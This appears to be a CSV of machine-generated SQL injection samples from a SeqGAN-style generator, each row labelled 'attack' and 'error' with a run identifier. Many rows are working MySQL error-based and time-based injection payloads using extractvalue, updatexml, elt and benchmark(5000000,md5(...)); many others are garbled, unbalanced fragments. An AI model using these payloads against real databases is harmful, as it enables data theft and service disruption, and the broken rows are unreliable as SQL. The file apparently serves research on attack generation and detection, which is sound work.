attack,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pqbbwo'  =  'e""  =  "")    )    wsnmxvFROMzlsxytyse  0x7171706a71(  (  (  5000000,md5  (  select   (  3576  )  (  (  (  (  case   (  3393,0x7171706a71,  (  benchmark  (  5000000(  select  (  (  e  (  7982=  (  (  =  5847  (  (  benchmark  (  (  5000000,md5  (  0x5c,  (  (  5000000(  0x5c,0x7171706a71,  (  5000000(  0x2e,m5  (  extractvalue  (  (  (  1297  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1481
attack,"1%',fuse  (  0x2e,  (  select   (  3576   (  4774  (  (  elt  9393  =  1808,1   from dua  elt  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  )  0x5c,0x7171706a71,  (  select   (  elt  (  0x5c,0x7171706a71,0x7171706a71,  (  (  select   (  elt  (  (  e  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  (  3393,0  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1482
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1483
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1484
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1485
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1486
attack,"1%""   )    )    ANDa",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1487
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1488
attack,"1%""  )   or   (  )  7757  )  (  select *1   )  4102  )  select   (  6581  =  (  (  9675  (  7982  =  (  (  7982  =  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,md5  (  0x5c,  (  (  5000000(  (  0x2e,0x7171706a71,  (  2917,md5  (  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  (  3393,,0x717a767a71  (  benchmark  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1489
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1490
attack,"1%""   )    (  extractvalue  (   a   (  6581(  (  7982  =  (  (  (  1759  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  5000000(  0x5c,0x7171706a71,  (  select   (  elt  (   0x2e   (  (  1297   (  (  elt  (  (  7982  =  (  1 0 from ddual  )  e  =  (  3393,1   )    )     )  extractvalue  (  benchmark  (   (  5433  (  1808,1   )    (  updatexml  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1491
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ymmzb'  =  'vksrole anse  (  3393  =  (  (  0x2e,0x7171706a71,  (  select   (  elt0x4b774c75   then 5847 extractvalue  (  (  (  (  0x5c,0x7171706a71,  (  9627,md5  (  (  select   (   (  (  elt  el_aname   (  )  (  (  0x5c,  )  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x52515a50   (  5423  (  1808,1   (  case from  (  elt  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1492
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1493
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1494
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1495
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1496
attack," 1%1%""  )   or extractvalue  (  (  0x2e,0x7171706a71,  (  (  0x5c,(  (  (  (  select   (  elt  (  1297  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  5000000(  (  3393  =  extractvalue  (  benchmark  (  (  1808,1   )    (    (  select   (  case when   (  (  (  elt  (  1808  =  5883  (  2518  (  7982,md5  (  select   (  5777  (  e  (  0x2e,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1497
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1498
attack,"1%""  =  ""'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1499
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1500
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1501
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1502
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1503
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1504
attack,"1 or extractvalue  (  0x4b774c75   (  1812  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  select   (  elt  (  elt  (  1297  =  (  (  7982  =  (  3393,md5  =  (  1808,1   (  case when   (  (  (  elt  9788  =  (  1297,1   )    (  extractvalue  (  9627,1   (  )  case when  =  (  1808,concat  (  (  0x4b774c75   (  (  7982  =  (  3393,0x717a767a71   (  (  1724  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1505
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1506
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1507
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'n' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1508
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1509
attack,"1%""   procedue analalysenanal  )  )  e    =  (  (  1808,concat  (  (  (  select   (  elt  (  elt  (  1297  =  (  1759(  (  0x4b774c75   end  (  (  elt  (  e  (  7982  =  (  (  0x5c,0x7171706a71,  (  5000000(  7982  =  (  (  1049  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  5000000,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1510
attack,""" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1511
attack,"1'  )   or extractvalue  (  (  (  3393,1   )    (  extractvalue  (  (  (  (  1297,concat  (  0x5c,0x7171706a71,(  (  (  (  select   (  elt  (  elt  (  0x2e,md5  (  (  select   (  elt  (  e  (  0x5c=  2917,  (  benchmark  (  (  5000000(  (  (  0x5c,  (  select   (  elt  1759  (  0x2e,  (  (  1049  =  (  5000000,md5  (  =  (  1808,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1512
attack,"1%'   )    )         (  extractvalue  (   (  5777  (  7982,concat  (  1808,concat  (  (  0x2e,0x7171706a71,  (  benchmark(  (  5000000,md50x7171706a71  (  (  ,l  (  (  select   (  el  (  1297  =  (  9627,md5  (  0x5c,0x7171706a71,  (  5000000  (  (  (  3393,1   )    (  extractvalue  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  select   (   (  (  8375  =  2917,1   (  )   or  (  (  select ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1513
attack,"1%'  =  'kbbanall  e  )  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  5000000(  (  0x5c,  (  (  (  5000000(  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  (  (  (  benchmark  (  1354  (  5000000(  (  (  (  (  (  (  0x5c,(  2917(  (  0x5c,  (  (  (  select   (  elt  e  (  select   (  8375  =  (  3393,1   from from d dua  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1514
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1515
attack,"1%""   )    )     extractvalue  (  (  (  3393,concat  (  (  1808=  (  (  (  (  (  (  (  1808  =  (  (  3393,0x7171706a71,  (  (  (  select   (  elt  (  1049  =  (  1759  (  (  5322  (  0x2e,0x7171706a71,  (  t  (  (  5000000,md5  (  1 0 as du else(r d d5   (  1724  (  e  5433  (  (  elt  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1516
attack,"1%"" and updatexml  (  (  (  (  (  (  (  (  (  1808,concat  (  (  7529  (  (  (  0x5c,0x7171706a71,  (  (  5000000(  (  0x5c,0x7171706a71,  (  (  3393,concat  (  (  (  (  0x5c,  (  1808,md5  (  (  0x5c,0x7171706a71,  (  select   (  case 0 anal  )  el  =  8868  (  7982=  (  8862   (  (  (  2518  lt  (  7982  =  (  (  7982  =  (  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1517
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'b'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1518
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1519
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "" p      usnnnat  (  (  0x4b774c75   )    (  (  select   (  3681  =  (  1297,concat  (  =  (  3393,  (  (  benchmark  (  (  (  benchmark  (  (  5000000(  (  0x2e,(  (  (  0x2e,md5  (  select   (  elt  (  elt  (  0x2e,  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  select   (  el  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1520
attack,"1%""   )    (  extractvalue  (  9627,concat  (  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  (  (  (  9627,concat  (  1808,1   )    (  extractvalue  (  1759,  (  select   (  9667   (  (   (  3576  =  5  (  5000000,md5  (  (  0x2e,(  (  select   (  elt  (  7982  =  extractvalue  (  (  (  9255,concat  (  (  1759  (  1759,md5  (  0x2e,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1521
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1522
attack,"1%""  )  )  case 5406 0 or extractvalueextractvalue  (  (  1297,concat  (  (  0x2e,0x7171706a71,updatexml  (  (  (  (  benchmark  (  (   (  (  (   (  (  (  case 5198  )  u  (  (  elt  )  0x5c,  (  (  benchmark  (  (  5000000(  (  0x5c,0x7171706a71,  (  5000000(  3393  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  5000000(  (  (  (  0x5c,  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1523
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1524
attack,"0x5c(ApSE   )    extractvalue  (  (  (  (  (  benchmark  (  (  (  7982,concat  (  1759,1   (  3576  =  (  (  (  (  1297,concat  (  (  (  benchmark  (  (  =  (case   (  5423  (  (  2917,md5  (  (  1297,concat  (  (  (  (  (  0x2e,0x7171706a71,  (  0x5c,0x7171706a71,  (  2917,md5  (  select   (  elt  elt  (  0x2e,1   (  updatexml  (  (  2917,  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1525
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1526
attack,"1%',1161    (  (   SELECT d 2501 3863   (  5433 0 0 from dual  )  )  )  )   fromdual  )  el   )    )dual  )  1808,  (  1759,1   (  case 0 from d5  (  elt  )  (  7982,  (  select   (  el  (  1759  =  (  1297,md5  (  0x52515a50   (  (  case when   (  1272  (  (  e  (  9627,md5  (  0x2e,0x7171706a71,  (  benchmark  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1527
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  'kznnmUSANDINT1znvvk",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1528
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'kpphf'  =  'kppwz",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1529
attack,"1%%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'o'  =  'k'  =  'pkjf      0x717a767a711then4688"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1530
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1531
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1532
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""ogk'  =  'kprocein      1161  (  elt  )  3393  1724  (  (  0x4b774c75   and 1812 0 0 5433  (  (  (  0   )  (  (  elt  (  e  (  1297  =  (  (  0x2e,0x7171706a71,  =  (  9627,1   )    )  0x717a767a71  extractvalue  (  (  4660  (  9627,concat  (  (  (  0x5c  =  (  3393,  (  select   (  elt  (  1808  =  (  =  (  (  1808  =  (  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1533
attack,"1%""   )    AND dueSYASSR$"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""eaeduaddreesanalyse  (  7997  )  )   end  (  elt  (  elt  (  3393  =  (  (  9627,concat  (  0x2e,0x7171706a71,  (  benchmark  (  (  6581  =  (  9627,1   )    (  extractvalue  (  9627,concat  (  (  =  (   (  9393  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  0x4b774c75   (  1535  )   (  (  (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1534
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1535
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1536
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1537
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1538
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1539
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1540
attack,"1',  (  (  (  (  (  (  (  (  3393,concat  (  (  (  (  =  (  1808,concat  (  (  (  (  0x5c,  (  5000000(  (  3393,1   (  extractvalue  (  (  5000000(  (  select   (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  e0x4b774c75   (  1724  (  t  (   from d5  )  elt  (  1297  =  (  0x2e,  (  (  (  5000000(  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1541
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1542
attack,"1%"" and extractvalue  (  (  (  (  (  (  (  (  =  3393,concat  (  (  (  9788(  (  =  (  (  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x5c,  (  select   (  elt  (  (  1759  =  (  (  (  0x5c,  (  select   ( 0 d5  (  elt  elt  (  1297  =  3393,  (  select   (  (  el  (  0x2e,0x7171706a71,  (  5000000,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1543
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  'k'  =  'c",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1544
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1545
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1546
attack,"1%,pp1161hf'  =  ''  =  'kb'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1547
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1548
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  'kbbnede  (  e  (  elt a  elt  (  e  select 0 from 0 a  )  case when   (  5603  (  case 0 0 from d 0 from dual  )  )  -- dual  )  )  )   end  (  (  elt  (  elt  (  (  1808  =  =  (  e  (  0x4b774c75   (  5433  (  0x5c,0x7171706a71,  (  (  benchmark  =  (  1049,1   )    9338,1  select   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1549
attack,"1%""   )    )    AND AND proh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1550
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1551
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vk'  =  'kppc",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1552
attack,"select   (  8375  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  1808=  (  =  (  0x5c,0x7171706a71,  (  0x5c,  (  select   (  elt  (  e  (  2917  =  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  (  (  2917  =  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  8868  )  5000000,md5  (  0x2e,1   )    )    AND 'i'  )  select   (  case when   (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1553
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1554
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1555
attack,1%%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1556
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'yNb'  =  '' like 'twedrese  (  (  el  (  7982  =  (  0x2e,0x7171706a71,  (  (  5000000(  (  0x5c,  (  5000000(  (  1297  =  (  3393,concat  (  (  (  0x5c,  (  (  benchmark  (  (  benchmark  (  (  5000000,m5  (  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  t  (  benchmark  (  5000000(  0x2e,md5  (  (  0x2e,md5  (  =  (  9788,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1557
